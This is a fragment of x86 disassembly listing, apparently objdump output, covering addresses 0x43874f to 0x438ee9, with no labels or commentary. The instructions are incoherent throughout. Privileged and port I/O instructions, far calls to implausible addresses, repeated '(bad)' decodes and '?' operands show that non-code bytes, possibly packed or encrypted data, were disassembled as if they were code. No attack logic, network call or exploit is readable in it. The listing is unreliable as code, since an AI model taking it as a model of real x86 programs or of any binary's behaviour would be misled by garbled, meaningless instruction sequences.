  43874f:	or     dh,BYTE PTR ds:0x4eb49b42
  438755:	call   0xa038:0x7ae2d06b
  43875c:	pop    edx
  43875d:	push   esp
  43875e:	fisub  WORD PTR [edi+0x47]
  438761:	loope  0x438782
  438763:	xchg   edi,eax
  438764:	inc    esi
  438765:	sahf   
  438766:	sar    BYTE PTR [eax+ebp*1+0x54aa1a92],1
  43876d:	xchg   esi,eax
  43876e:	jmp    0x9df7f4d4
  438773:	xchg   esp,eax
  438774:	push   0xffffffb4
  438776:	sbb    cl,BYTE PTR [edi+0x56d47f89]
  43877c:	pushf  
  43877d:	bound  edi,QWORD PTR ds:0x10026fb6
  438783:	xchg   esi,eax
  438784:	test   al,0x76
  438786:	into   
  438787:	ds in  eax,dx
  438789:	cmp    DWORD PTR [edx+0x3702331d],ebx
  43878f:	dec    edi
  438790:	sub    ah,ch
  438792:	cwde   
  438793:	mov    esi,0xd39605e3
  438798:	cmp    DWORD PTR [ebx+0x3bb67fa9],0x1f
  43879f:	xlat   BYTE PTR ds:[ebx]
  4387a0:	cdq    
  4387a1:	push   eax
  4387a2:	cli    
  4387a3:	push   esi
  4387a4:	pop    eax
  4387a5:	hlt    
  4387a6:	or     dl,ah
  4387a8:	cmc    
  4387a9:	sbb    al,0x72
  4387ab:	jne    0x4387fa
  4387ad:	mov    ebx,0x5780bf2a
  4387b2:	outs   dx,DWORD PTR ds:[esi]
  4387b3:	or     bh,BYTE PTR [edi-0x16]
  4387b6:	loopne 0x438768
  4387b8:	pop    esp
  4387b9:	and    BYTE PTR [ecx+0xef8d5d7],0x2
  4387c0:	jb     0x4387c1
  4387c2:	add    esp,DWORD PTR [edi]
  4387c4:	push   eax
  4387c5:	bound  ebx,QWORD PTR [edi]
  4387c7:	cmp    ebp,ebx
  4387c9:	or     eax,0x52e2e799
  4387ce:	fwait
  4387cf:	pushf  
  4387d0:	jbe    0x4387e7
  4387d2:	mov    ebp,0x7c9a5cd4
  4387d7:	jne    0x4387a3
  4387d9:	out    0xc,al
  4387db:	enter  0xd5b2,0x3
  4387df:	inc    esp
  4387e0:	scas   al,BYTE PTR es:[edi]
  4387e1:	inc    edx
  4387e2:	push   ds
  4387e3:	int    0x9
  4387e5:	cli    
  4387e6:	jmp    0x4387fc
  4387e8:	mov    edx,ebx
  4387ea:	stos   BYTE PTR es:[edi],al
  4387eb:	fstp   QWORD PTR [esi-0x71]
  4387ee:	mov    edx,DWORD PTR [edx-0x6cdf0293]
  4387f4:	test   DWORD PTR ds:0xbf70e73e,0xaac7343e
  4387fe:	jle    0x438877
  438800:	mov    dh,0xe0
  438802:	aas    
  438803:	adc    bl,BYTE PTR [ebp+0x10a57d6a]
  438809:	jb     0x43881f
  43880b:	cld    
  43880c:	bound  ebp,QWORD PTR [edx+0x98884e1]
  438812:	(bad)  
  438813:	xor    BYTE PTR [ecx],bh
  438815:	xor    BYTE PTR [ebx],bh
  438817:	mov    WORD PTR [edi+0x62218b83],es
  43881d:	xlat   BYTE PTR ds:[ebx]
  43881e:	dec    ebp
  43881f:	add    BYTE PTR [ecx-0x2a],cl
  438822:	test   al,0x9
  438824:	push   edi
  438825:	add    dh,al
  438827:	call   0xad8e:0x3e550028
  43882e:	popa   
  43882f:	popa   
  438830:	sar    ch,1
  438832:	ins    DWORD PTR es:[edi],dx
  438833:	mov    ch,0x69
  438835:	jecxz  0x438816
  438837:	cmp    eax,0xd5a50eea
  43883c:	xlat   BYTE PTR ds:[ebx]
  43883d:	lahf   
  43883e:	add    al,0xa6
  438840:	hlt    
  438841:	mov    dh,0x23
  438843:	nop
  438844:	mov    cl,cl
  438846:	cmp    DWORD PTR [ebp+0x5189278d],ebx
  43884c:	cmp    al,0x0
  43884e:	mov    dl,0xc3
  438850:	add    al,0x6e
  438852:	das    
  438853:	sbb    BYTE PTR [eax+edi*8+0x1a],bh
  438857:	add    DWORD PTR [ebp+ebp*4-0x52647768],ebx
  43885e:	push   esp
  43885f:	clc    
  438860:	cmp    eax,DWORD PTR [edx]
  438862:	shl    DWORD PTR [edx+0x5d],cl
  438865:	pop    esp
  438866:	dec    edx
  438867:	add    al,0x33
  438869:	add    BYTE PTR [edi],bl
  43886b:	push   ebp
  43886c:	ret    0x6bb
  43886f:	sub    al,0x57
  438871:	jle    0x4388dc
  438873:	pop    ebp
  438874:	jp     0x438819
  438876:	loop   0x4388e7
  438878:	xchg   BYTE PTR [edi-0x76566aac],dh
  43887e:	mov    esp,DWORD PTR ds:0x164814d0
  438884:	out    dx,al
  438885:	fcomp  QWORD PTR [eax]
  438887:	mov    ah,0xa9
  438889:	(bad)  
  43888a:	outs   dx,DWORD PTR ds:[esi]
  43888b:	dec    BYTE PTR [ecx+0x935df0b]
  438891:	(bad)
  438894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438895:	shl    BYTE PTR [eax],cl
  438897:	pop    edi
  438898:	push   DWORD PTR [eax]
  43889a:	pop    ds
  43889b:	lods   eax,DWORD PTR ds:[esi]
  43889c:	pop    ebx
  43889d:	lahf   
  43889e:	inc    edi
  43889f:	pop    eax
  4388a0:	mov    ?,WORD PTR [esi+0x1f]
  4388a3:	sti    
  4388a4:	out    0x51,eax
  4388a6:	cmp    DWORD PTR [ecx-0x2a87dfb4],0xa4fd14fa
  4388b0:	adc    eax,0x8858e9ae
  4388b5:	cdq    
  4388b6:	inc    esp
  4388b7:	xchg   ecx,eax
  4388b8:	mov    eax,fs:0x322ca22
  4388be:	cli    
  4388bf:	inc    edx
  4388c0:	je     0x4388f6
  4388c2:	push   0x6dcbe032
  4388c7:	mov    DWORD PTR [ebx-0x1d],esi
  4388ca:	in     al,0xb5
  4388cc:	sar    ch,0x60
  4388cf:	(bad)  
  4388d0:	(bad)  
  4388d1:	hlt    
  4388d2:	adc    al,0x1c
  4388d4:	pusha  
  4388d5:	adc    BYTE PTR [edx-0x61],bl
  4388d8:	mov    al,BYTE PTR [edx+0x3f90b911]
  4388de:	clc    
  4388df:	in     eax,dx
  4388e0:	mov    DWORD PTR [ebx-0x4dce6547],esi
  4388e6:	(bad)
  4388e9:	push   ds
  4388ea:	add    al,0xb2
  4388ec:	jge    0x4388bd
  4388ee:	and    ah,BYTE PTR [edi]
  4388f0:	dec    ecx
  4388f1:	(bad)  
  4388f2:	loope  0x438951
  4388f4:	mov    BYTE PTR [ebp-0x2],bl
  4388f7:	loope  0x4388fe
  4388f9:	pop    edi
  4388fa:	mov    dh,0xdd
  4388fc:	mov    bh,0x1
  4388fe:	dec    esp
  4388ff:	int    0xaa
  438901:	call   0xe2b5:0x63487b23
  438908:	mov    DWORD PTR [ecx],edi
  43890a:	out    0xd8,al
  43890c:	or     ah,ah
  43890e:	inc    edi
  43890f:	div    BYTE PTR ss:[ebx-0xe]
  438913:	mov    cs,WORD PTR [ecx-0x3888cb7b]
  438919:	push   esi
  43891a:	cmc    
  43891b:	dec    eax
  43891c:	mov    ebp,edi
  43891e:	(bad)  
  43891f:	pushf  
  438920:	fs push ss
  438922:	cmp    eax,0x1ea70069
  438927:	mov    eax,0xbe9a016b
  43892c:	or     DWORD PTR [ebp-0x7aa6c861],ecx
  438932:	ins    DWORD PTR es:[edi],dx
  438933:	xchg   edi,eax
  438934:	cld    
  438935:	sub    bh,BYTE PTR [edi+0x42]
  438938:	sub    al,0x90
  43893a:	pop    ecx
  43893b:	push   ebp
  43893c:	js     0x4388fe
  43893e:	jle    0x438914
  438940:	adc    eax,0xe543333f
  438945:	mov    eax,ds:0x5bf35b73
  43894a:	mov    ch,0xae
  43894c:	adc    ecx,DWORD PTR [ebx+edx*1]
  43894f:	scas   eax,DWORD PTR es:[edi]
  438950:	mov    DWORD PTR [edi+0x6250f772],esi
  438956:	not    ah
  438958:	arpl   WORD PTR [edx+0x38c7a61a],ax
  43895e:	es inc edi
  438960:	mov    BYTE PTR [edi+0x7fab5dd5],bl
  438966:	mov    ah,0x67
  438968:	dec    eax
  438969:	add    al,dh
  43896b:	add    DWORD PTR [edi+0x75],ebp
  43896e:	xchg   BYTE PTR [ecx-0x449f6134],bh
  438974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438975:	lods   al,BYTE PTR ds:[esi]
  438976:	add    esp,ebx
  438978:	pushf  
  438979:	jmp    0x4388fd
  43897b:	mov    ecx,0x84fdf148
  438980:	leave  
  438981:	cwde   
  438982:	and    ah,al
  438984:	dec    esp
  438985:	in     al,0x60
  438987:	and    DWORD PTR [edi+edx*8-0x40],esi
  43898b:	mov    DWORD PTR [ebp+0x42f7932e],edx
  438991:	sbb    al,0x48
  438993:	xor    eax,0xd6a0aaf3
  438998:	leave  
  438999:	xchg   esp,eax
  43899a:	add    eax,0xb3b5894f
  43899f:	icebp  
  4389a0:	dec    eax
  4389a1:	pop    ss
  4389a2:	dec    esp
  4389a3:	cli    
  4389a4:	and    DWORD PTR [edx],eax
  4389a6:	cmp    BYTE PTR [ebx],0xda
  4389a9:	and    eax,0x796594e8
  4389ae:	je     0x4389d1
  4389b0:	mov    al,ds:0x39a911bc
  4389b5:	lods   eax,DWORD PTR ds:[esi]
  4389b6:	pusha  
  4389b7:	mov    esi,0xd74e175c
  4389bc:	sub    eax,0x59bcf155
  4389c1:	frstor [esi-0x661a56ec]
  4389c7:	stos   DWORD PTR es:[edi],eax
  4389c8:	test   BYTE PTR [ebx+ebx*8+0x3b],0xa
  4389cd:	call   0x643f:0x1c8dcab7
  4389d4:	js     0x4389d8
  4389d6:	jp     0x438a31
  4389d8:	popf   
  4389d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4389da:	fld    st(3)
  4389dc:	mov    dl,0xb4
  4389de:	or     edi,DWORD PTR [ebp-0x7]
  4389e1:	cli    
  4389e2:	pusha  
  4389e3:	psubusw mm0,mm7
  4389e6:	mov    eax,ds:0x2ed21aa6
  4389eb:	rcr    BYTE PTR [edi+0x79],cl
  4389ee:	out    dx,al
  4389ef:	inc    esp
  4389f0:	pop    ebx
  4389f1:	inc    edx
  4389f2:	lahf   
  4389f3:	sub    al,0xc6
  4389f5:	sti    
  4389f6:	pop    ecx
  4389f7:	sbb    DWORD PTR [esi+0x50],edx
  4389fa:	lahf   
  4389fb:	das    
  4389fc:	aad    0xd0
  4389fe:	mov    es,WORD PTR [eax]
  438a00:	pop    ss
  438a01:	sbb    al,0xae
  438a03:	pop    edi
  438a04:	xchg   edi,eax
  438a05:	push   cs
  438a06:	push   ebx
  438a07:	cmc    
  438a08:	cmp    DWORD PTR [edi+0x2a],edi
  438a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a0c:	mov    eax,ds:0xeed13f33
  438a11:	add    dl,BYTE PTR [edx+ebx*8-0x6ef3d402]
  438a18:	sub    DWORD PTR [edx-0x2a],ebx
  438a1b:	sbb    ecx,ebx
  438a1d:	pop    ss
  438a1e:	push   edx
  438a1f:	in     eax,dx
  438a20:	adc    al,0xfd
  438a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438a23:	fild   QWORD PTR [eax+0xf]
  438a26:	jbe    0x438a0a
  438a28:	mov    cl,0x75
  438a2a:	sbb    ch,BYTE PTR [edx]
  438a2c:	mov    ebp,esp
  438a2e:	push   ebx
  438a2f:	cwde   
  438a30:	fsub   QWORD PTR [ebp+0x8dff22]
  438a36:	mov    eax,0x15ecf1ac
  438a3b:	inc    esp
  438a3c:	es add eax,0x89fdc85f
  438a42:	test   eax,0x9dc589fe
  438a47:	add    DWORD PTR [edi-0x70f3ae8b],esp
  438a4d:	imul   DWORD PTR [ecx]
  438a4f:	or     DWORD PTR [edx+0x6b],0xffffffa2
  438a53:	fs pusha 
  438a55:	mov    bl,0x6f
  438a57:	aad    0xc
  438a59:	dec    esp
  438a5a:	xchg   ebx,eax
  438a5b:	mov    dh,0x5c
  438a5d:	dec    esp
  438a5e:	push   cs
  438a5f:	into   
  438a60:	mov    DWORD PTR [ebx+0x338f0e23],edx
  438a66:	mov    ecx,DWORD PTR [edx+0x5bbe1d09]
  438a6c:	pusha  
  438a6d:	(bad)  [ecx-0x78]
  438a71:	loope  0x438ad5
  438a73:	inc    ecx
  438a74:	sar    BYTE PTR [ebx+eiz*1-0x4c7678e8],1
  438a7b:	in     eax,0x89
  438a7d:	and    bl,BYTE PTR [ecx]
  438a7f:	ins    BYTE PTR es:[edi],dx
  438a80:	adc    ch,bl
  438a82:	pop    cx
  438a84:	mov    ch,0x99
  438a86:	sub    bh,BYTE PTR [edi+0x8]
  438a89:	ins    BYTE PTR es:[edi],dx
  438a8a:	add    DWORD PTR [esi-0x2a984cf2],0xffffff8b
  438a91:	int3   
  438a92:	test   edx,edx
  438a94:	iret   
  438a95:	push   edx
  438a96:	inc    edi
  438a97:	imul   edi,DWORD PTR [esi+0x66],0x3bca231f
  438a9e:	dec    edi
  438a9f:	cwde   
  438aa0:	add    BYTE PTR fs:[edx],0xd2
  438aa4:	adc    eax,0x266dbe74
  438aa9:	leave  
  438aaa:	pusha  
  438aab:	bound  esi,QWORD PTR [ebx-0x48d482c7]
  438ab1:	lock out 0x17,al
  438ab4:	out    dx,al
  438ab5:	push   ss
  438ab6:	aas    
  438ab7:	mov    al,0xfd
  438ab9:	add    eax,0xbd5ce0a0
  438abe:	inc    esi
  438abf:	add    al,0x88
  438ac1:	jno    0x438ab0
  438ac3:	inc    ebp
  438ac4:	rcr    DWORD PTR [eax+0x3d],cl
  438ac7:	jge    0x438ad6
  438ac9:	and    eax,0xb2241d2a
  438ace:	pop    ds
  438acf:	push   ss
  438ad0:	jmp    0xacbd2055
  438ad5:	xchg   ebx,eax
  438ad6:	inc    ebp
  438ad7:	nop
  438ad8:	push   ecx
  438ad9:	test   eax,0x31baa37d
  438ade:	pop    ds
  438adf:	push   esp
  438ae0:	stos   BYTE PTR es:[edi],al
  438ae1:	add    eax,0xbb8a2e37
  438ae6:	div    BYTE PTR [eax-0x7b9cdd4]
  438aec:	sbb    bl,ah
  438aee:	rcl    ebx,1
  438af0:	mov    al,ds:0x8d60701
  438af5:	push   0xc58a5478
  438afa:	rcr    DWORD PTR [ecx-0x4e06782],0x91
  438b01:	push   eax
  438b02:	mov    bl,0xb1
  438b04:	inc    esp
  438b05:	bound  edx,QWORD PTR ds:0x66447bd4
  438b0b:	ins    BYTE PTR es:[edi],dx
  438b0c:	into   
  438b0d:	xor    dl,al
  438b0f:	add    DWORD PTR [eax-0xb],ecx
  438b12:	pop    edx
  438b13:	stc    
  438b14:	nop
  438b15:	ss push ds
  438b17:	cmp    edx,esi
  438b19:	loop   0x438b00
  438b1b:	sbb    BYTE PTR [edx],bh
  438b1d:	add    ecx,DWORD PTR [esi+0x61fa238c]
  438b23:	call   0x73635abf
  438b28:	dec    edx
  438b29:	pop    es
  438b2a:	sbb    bl,0xc3
  438b2d:	dec    ebx
  438b2e:	(bad)  
  438b2f:	repz pop ss
  438b31:	add    cl,ah
  438b33:	fs test eax,0xedd0874d
  438b39:	mov    al,ds:0xef5e576e
  438b3e:	inc    esp
  438b3f:	sbb    al,0xe9
  438b41:	sahf   
  438b42:	push   ebp
  438b43:	lahf   
  438b44:	inc    ebx
  438b45:	add    eax,eax
  438b47:	loope  0x438b0b
  438b49:	or     BYTE PTR [edx+0x57858fea],bh
  438b4f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  438b51:	mov    ah,0x60
  438b53:	jg     0x438b45
  438b55:	stos   BYTE PTR es:[edi],al
  438b56:	les    esi,FWORD PTR [ebp+0x78]
  438b59:	jns    0x438b46
  438b5b:	aad    0x76
  438b5d:	ds retf 0x81c8
  438b61:	sar    dl,0x38
  438b64:	mov    BYTE PTR [ebp+0x5],dl
  438b67:	iret   
  438b68:	fadd   st(7),st
  438b6a:	popa   
  438b6b:	dec    eax
  438b6c:	pop    ebx
  438b6d:	add    al,BYTE PTR [eax+0x6139ee6c]
  438b73:	sub    eax,0xef9910e7
  438b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438b79:	add    eax,0x935070a5
  438b7e:	cmp    ebx,edx
  438b80:	push   cs
  438b81:	add    esi,DWORD PTR [eax+0x14affcce]
  438b87:	aas    
  438b88:	adc    eax,0x25911e16
  438b8d:	pop    ebp
  438b8e:	aas    
  438b8f:	pop    ecx
  438b90:	out    dx,al
  438b91:	adc    al,BYTE PTR [edi+0x1f8564d2]
  438b97:	xor    dh,BYTE PTR [ecx+edi*4+0x30]
  438b9b:	out    0x97,eax
  438b9d:	or     ah,BYTE PTR [esi+0x13]
  438ba0:	vpmullw xmm7,xmm4,xmm6
  438ba4:	xor    eax,0x7281e682
  438ba9:	add    ebx,DWORD PTR [eax+0x604b1c9b]
  438baf:	jmp    DWORD PTR [ecx]
  438bb1:	push   0x14acad9c
  438bb6:	sub    ecx,DWORD PTR [esi]
  438bb8:	pop    ebx
  438bb9:	mov    ecx,0xa6ce7dff
  438bbe:	lock shl BYTE PTR [ecx-0x34],cl
  438bc2:	inc    edx
  438bc3:	mov    bl,0x32
  438bc5:	frstor [ecx+0x5a]
  438bc8:	xor    eax,DWORD PTR [eax]
  438bca:	stos   DWORD PTR es:[edi],eax
  438bcb:	lods   eax,DWORD PTR ds:[esi]
  438bcc:	in     eax,0x93
  438bce:	add    ch,BYTE PTR [eax]
  438bd0:	dec    eax
  438bd1:	cmp    DWORD PTR [esi+eiz*4-0x670b029c],ebp
  438bd8:	mov    BYTE PTR [ecx],dl
  438bda:	or     bl,BYTE PTR [edx]
  438bdc:	cmp    ecx,DWORD PTR [edx+eax*1]
  438bdf:	inc    esp
  438be0:	mov    DWORD PTR [edi],edi
  438be2:	jle    0x438bbd
  438be4:	and    ch,BYTE PTR ds:0x5cc5ff6
  438bea:	in     al,0xda
  438bec:	or     al,0xf7
  438bee:	or     al,0xc4
  438bf0:	jmp    0x438c13
  438bf2:	pop    ds
  438bf3:	mov    bl,0x87
  438bf5:	fsub   DWORD PTR [ecx-0xa]
  438bf8:	push   ss
  438bf9:	clc    
  438bfa:	es aam 0xd1
  438bfd:	xor    DWORD PTR [ebx-0x6f910063],edi
  438c03:	mov    DWORD PTR [edi+0x1eef728b],ebx
  438c09:	sbb    al,0x34
  438c0b:	mov    ah,BYTE PTR [ebx+0x3e043f74]
  438c11:	ds (bad) 
  438c13:	aad    0xca
  438c15:	imul   ebp,esp,0x28
  438c18:	push   ebp
  438c19:	ins    DWORD PTR es:[edi],dx
  438c1a:	aad    0xe8
  438c1c:	push   edi
  438c1e:	dec    ecx
  438c1f:	lods   eax,DWORD PTR ds:[esi]
  438c20:	cli    
  438c21:	sti    
  438c22:	mov    ebp,0xbffd0821
  438c27:	pop    esp
  438c28:	retf   0xf2f6
  438c2b:	xlat   BYTE PTR ds:[ebx]
  438c2c:	test   al,0x96
  438c2e:	fist   WORD PTR [edx]
  438c30:	test   BYTE PTR [ebx],al
  438c32:	std    
  438c33:	cmp    eax,0x2f1e72f6
  438c38:	jecxz  0x438bc7
  438c3a:	push   esi
  438c3b:	xchg   ecx,eax
  438c3c:	mov    es,ebp
  438c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438c3f:	aad    0x8a
  438c41:	icebp  
  438c42:	sub    al,0xd3
  438c44:	jo     0x438c1a
  438c46:	sub    eax,0xff67887f
  438c4b:	out    0xc9,eax
  438c4d:	dec    edi
  438c4e:	mov    gs,WORD PTR [ebp-0x4d1de06d]
  438c54:	xor    ebp,DWORD PTR [esi-0x38]
  438c57:	add    DWORD PTR [ecx],ebx
  438c59:	jmp    DWORD PTR [eax-0x13927716]
  438c5f:	xor    esp,DWORD PTR [ebp+0x13]
  438c62:	jmp    0x438c2d
  438c64:	test   eax,0x81dc7d04
  438c69:	add    dh,BYTE PTR [eax+0x3590dfa7]
  438c6f:	add    al,0x92
  438c71:	fisub  DWORD PTR [eax+0x73]
  438c74:	dec    ecx
  438c75:	aas    
  438c76:	xor    bx,WORD PTR [edx+eax*1]
  438c7a:	or     esp,edx
  438c7c:	lods   eax,DWORD PTR ds:[esi]
  438c7d:	fs (bad) 
  438c7f:	or     ch,BYTE PTR [ecx+0x1e]
  438c82:	sbb    cl,BYTE PTR [ecx-0x51]
  438c85:	popa   
  438c86:	cmc    
  438c87:	and    al,0x88
  438c89:	fist   DWORD PTR [ebx+edx*2+0x78]
  438c8d:	lea    ebp,[eiz*4+0x5b90a1eb]
  438c94:	mov    ecx,0xec15cd54
  438c99:	pop    edx
  438c9a:	push   ss
  438c9b:	mov    dh,0x89
  438c9d:	pop    ebx
  438c9e:	hlt    
  438c9f:	mov    ebp,0xddfea6ac
  438ca4:	loop   0x438ca8
  438ca6:	jo     0x438ca9
  438ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438ca9:	inc    edx
  438caa:	out    dx,al
  438cab:	aas    
  438cac:	push   0xffffff88
  438cae:	pop    ds
  438caf:	outs   dx,DWORD PTR ds:[esi]
  438cb0:	(bad)  
  438cb1:	pop    ds
  438cb2:	xchg   dl,ah
  438cb4:	and    al,0xcd
  438cb6:	xchg   ecx,eax
  438cb7:	aad    0xa0
  438cb9:	jne    0x438c99
  438cbb:	inc    ebx
  438cbc:	jo     0x438ca8
  438cbe:	dec    ebx
  438cbf:	xor    BYTE PTR [eax+0x4335033b],cl
  438cc5:	fld    st(7)
  438cc7:	add    eax,DWORD PTR [ebp+0x5e70d005]
  438ccd:	inc    ecx
  438cce:	pop    ss
  438ccf:	and    BYTE PTR [ecx],bh
  438cd1:	fistp  DWORD PTR [esi+0x1805e0df]
  438cd7:	and    eax,0x1776f01
  438cdc:	sbb    eax,DWORD PTR [edi-0x637718cb]
  438ce2:	fist   WORD PTR [ebx]
  438ce4:	gs sar bh,1
  438ce7:	xor    ah,BYTE PTR [ecx+0x44]
  438cea:	push   ds
  438ceb:	test   eax,0xf609fcdf
  438cf0:	mov    edx,0xd7d55479
  438cf5:	into   
  438cf6:	cmp    ah,BYTE PTR [ebp-0x7b6c1012]
  438cfc:	test   DWORD PTR [ecx],ecx
  438cfe:	push   ds
  438cff:	sbb    BYTE PTR [edx-0x46],0xd3
  438d03:	aad    0x9
  438d05:	or     eax,0xa2643f03
  438d0a:	repz pop eax
  438d0c:	stc    
  438d0d:	adc    DWORD PTR [ebp-0x3f84002b],ecx
  438d13:	bound  ecx,QWORD PTR [edx-0x3e6182e9]
  438d19:	stos   BYTE PTR es:[edi],al
  438d1a:	xor    al,0xd4
  438d1c:	fldcw  WORD PTR [esi+0x9]
  438d1f:	lods   eax,DWORD PTR ds:[esi]
  438d20:	pop    ss
  438d21:	mov    cl,0x18
  438d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438d24:	mov    BYTE PTR [ebx+0x2c1747f6],ah
  438d2a:	retf   0x4114
  438d2d:	add    edi,esi
  438d2f:	mov    DWORD PTR [ecx-0x500d1c0a],ecx
  438d35:	mov    edi,0x71492f60
  438d3a:	dec    ecx
  438d3b:	push   ebp
  438d3c:	mov    eax,0x3faaefe3
  438d41:	rcr    al,0x6a
  438d44:	mov    bl,0x20
  438d46:	and    al,0xe1
  438d48:	inc    edx
  438d49:	retf   
  438d4a:	sub    BYTE PTR [edx],ch
  438d4c:	mov    BYTE PTR [ecx],cl
  438d4e:	jp     0x438d16
  438d50:	dec    edi
  438d51:	rol    BYTE PTR [edx+ebx*8+0x55d803f7],cl
  438d58:	aas    
  438d59:	stos   BYTE PTR es:[edi],al
  438d5a:	dec    DWORD PTR cs:[edx]
  438d5d:	fidiv  DWORD PTR [esi+0x64]
  438d60:	mov    ch,0x3
  438d62:	xchg   BYTE PTR es:[eax],cl
  438d65:	and    ch,BYTE PTR [ecx]
  438d67:	(bad)  
  438d68:	and    edx,eax
  438d6a:	data16 js 0x438d35
  438d6d:	xlat   BYTE PTR ds:[ebx]
  438d6e:	imul   edx,ebp,0x4ce2ea63
  438d74:	xchg   ebp,eax
  438d75:	inc    ebp
  438d76:	popa   
  438d77:	repz (bad) 
  438d79:	jg     0x438dfa
  438d7b:	mov    ecx,0x3ad8e583
  438d80:	xchg   ebx,eax
  438d81:	add    eax,0xd76c67e2
  438d86:	int3   
  438d87:	imul   ebp,DWORD PTR [eax+0x4551e1e],0xffffff9a
  438d8e:	mov    ebp,0x6a58e2b9
  438d93:	aad    0x64
  438d95:	(bad)  
  438d97:	dec    BYTE PTR [edi+esi*1-0x37]
  438d9b:	js     0x438d94
  438d9d:	(bad)  [ecx]
  438d9f:	xlat   BYTE PTR ds:[ebx]
  438da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438da1:	xchg   ebp,eax
  438da2:	std    
  438da3:	xchg   ebx,eax
  438da4:	je     0x438d65
  438da6:	cdq    
  438da7:	aad    0x58
  438da9:	jb     0x438e27
  438dab:	xlat   BYTE PTR ds:[ebx]
  438dac:	cmp    eax,0x89dce4a7
  438db1:	add    edi,0x7c
  438db4:	fs or  al,0xc2
  438db7:	popa   
  438db8:	test   al,0x8d
  438dba:	lea    esp,[edx]
  438dbc:	mov    DWORD PTR [edx-0x3f2b74e9],ebp
  438dc2:	xchg   ebx,eax
  438dc3:	aaa    
  438dc4:	cld    
  438dc5:	iret   
  438dc6:	sub    dl,bh
  438dc8:	loopne 0x438d5d
  438dca:	stos   BYTE PTR es:[edi],al
  438dcb:	inc    ecx
  438dcc:	pop    esi
  438dcd:	mov    WORD PTR [edi],es
  438dcf:	xlat   BYTE PTR ds:[ebx]
  438dd0:	mov    ch,0x9f
  438dd2:	jne    0x438d5a
  438dd4:	xor    BYTE PTR cs:[ecx+eiz*8],dh
  438dd8:	mov    BYTE PTR [ecx+0x4c78072c],bh
  438dde:	fnstsw WORD PTR [esi]
  438de0:	xchg   ebx,eax
  438de1:	daa    
  438de2:	mov    dl,0x16
  438de4:	leave  
  438de5:	iret   
  438de6:	mov    ebx,0x12c9891a
  438deb:	dec    edx
  438dec:	out    dx,al
  438ded:	neg    BYTE PTR [edx-0x73]
  438df0:	out    dx,eax
  438df1:	sbb    eax,0x1bf16c
  438df6:	lahf   
  438df7:	and    al,0xf6
  438df9:	loop   0x438e72
  438dfb:	stos   DWORD PTR es:[edi],eax
  438dfc:	out    0xd8,eax
  438dfe:	retf   0x7945
  438e01:	mov    ds:0x2e481342,eax
  438e06:	push   ds
  438e07:	pop    ds
  438e08:	and    al,0x14
  438e0a:	or     eax,0xcf1d94d2
  438e0f:	aad    0x44
  438e11:	mov    al,ds:0x8f2907d1
  438e16:	je     0x438e1a
  438e18:	mov    BYTE PTR [edi],ah
  438e1a:	sbb    al,0x5c
  438e1c:	or     DWORD PTR [ecx],eax
  438e1e:	xor    eax,0x9075bb8f
  438e23:	dec    DWORD PTR [ecx-0x48bfba5b]
  438e29:	xchg   ebx,eax
  438e2a:	adc    edx,ecx
  438e2c:	mov    BYTE PTR [ecx-0x2],ch
  438e2f:	add    al,0xe3
  438e31:	icebp  
  438e32:	or     DWORD PTR [ebx],ebx
  438e34:	ja     0x438e39
  438e36:	mov    dl,BYTE PTR [edx+eax*8+0x29]
  438e3a:	and    BYTE PTR [ecx+0x2d659602],dl
  438e40:	adc    edi,DWORD PTR [esp+ebp*8-0x15]
  438e44:	stc    
  438e45:	adc    ebp,DWORD PTR [esi+0x6098f7bc]
  438e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438e4c:	ror    BYTE PTR [edx-0x1a],cl
  438e4f:	jmp    0x438dda
  438e51:	cmp    esi,DWORD PTR [edi+0x67]
  438e54:	push   ds
  438e55:	pop    ebx
  438e56:	push   ebx
  438e57:	ja     0x438e3d
  438e59:	add    bh,BYTE PTR [edx]
  438e5b:	pop    ds
  438e5c:	daa    
  438e5d:	sub    dl,al
  438e5f:	es push ebx
  438e61:	mov    ds:0x1569c3d0,eax
  438e66:	in     al,0x9d
  438e68:	mov    WORD PTR [edx-0x22],?
  438e6b:	les    esp,FWORD PTR [eax+0x4bd40c6d]
  438e71:	shr    DWORD PTR ds:0x8243feda,cl
  438e77:	or     ecx,DWORD PTR [ecx-0x2576bc95]
  438e7d:	mov    eax,0x10fe7822
  438e82:	(bad)  
  438e83:	or     eax,0x331fb783
  438e88:	and    al,0x3a
  438e8a:	xchg   edx,eax
  438e8b:	ins    DWORD PTR es:[edi],dx
  438e8c:	mov    ah,bh
  438e8e:	dec    edx
  438e8f:	add    DWORD PTR [ebp*4-0x68ef6848],esp
  438e96:	cmp    BYTE PTR [ebp-0x30e88600],dh
  438e9c:	xchg   ebp,eax
  438e9d:	add    edi,ebx
  438e9f:	pop    ecx
  438ea0:	inc    esp
  438ea1:	pop    ebp
  438ea2:	scas   al,BYTE PTR es:[edi]
  438ea3:	imul   ecx,DWORD PTR [ecx-0x204899cb],0x1c
  438eaa:	pushf  
  438eab:	push   ss
  438eac:	(bad)  [edi]
  438eae:	clc    
  438eaf:	leave  
  438eb0:	and    dl,BYTE PTR [esi-0x481de75f]
  438eb6:	ss out dx,eax
  438eb8:	mov    ch,BYTE PTR [edx]
  438eba:	push   ds
  438ebb:	xchg   ecx,eax
  438ebc:	aam    0x68
  438ebe:	xchg   ecx,eax
  438ebf:	cmp    BYTE PTR [ebx+ebx*4+0x3ceed57b],bl
  438ec6:	jmp    FWORD PTR [ebx]
  438ec8:	pop    ebp
  438ec9:	or     ch,0x6b
  438ecc:	mov    DWORD PTR [ecx+0x50],edx
  438ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438ed0:	repnz nop
  438ed2:	sbb    eax,0x9a2c8766
  438ed7:	mov    ds:0x9460cda0,al
  438edc:	int    0x7c
  438ede:	push   0x1cc2654d
  438ee3:	or     dl,BYTE PTR [ecx+0x39]
  438ee6:	pop    esp
  438ee7:	jnp    0x438f08
  438ee9:	clc    
